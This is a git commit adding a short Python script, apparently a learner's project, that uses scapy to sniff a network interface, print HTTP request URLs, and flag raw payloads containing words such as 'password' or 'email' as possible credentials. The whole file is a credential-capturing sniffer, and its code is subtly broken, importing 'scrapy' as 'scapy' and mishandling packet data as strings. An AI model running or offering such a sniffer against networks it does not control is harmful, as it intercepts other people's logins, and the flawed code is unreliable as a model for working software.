9ddcc9795c09a57d0f9f783e48b4b7839d8891a9
Daniel Osuoha <122853068+DanielOsuoha@users.noreply.github.com>
2024-06-17 01:52:56 +0000

    added the fourth project

---
+++ 04/packet_sniffer.py
@@ -0,0 +1,30 @@
+#! /usr/bin/env python
+
+import scrapy as scapy
+import argparse
+from scapy.layers import http
+
+def get_interface():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-i", "--interface", dest="interface", help="Interface to use")
+    options = parser.parse_args()
+    if not options.interface:
+        options.interface = input("Enter interface: ")
+    return options.interface
+
+def sniff(iface):
+    scapy.sniff(iface=iface, store=False, prn=process_sniffed_packet)
+
+def process_sniffed_packet(packet):
+    if packet.haslayer(http.HTTPRequest):
+        print("[+] Http Request >> " + packet[http.HTTPRequest].Host + packet[http.HTTPRequest].path)
+        if packet.haslayer(scapy.Raw):
+            load = packet[scapy.Raw]
+            keys = ["user", "password", "pass", "email"]
+            for key in keys:
+                if key in load:
+                    print("[+] Possible password/username >>" + load)
+                    break
+            print(packet.show())
+iface = get_interface()
+sniff(iface)
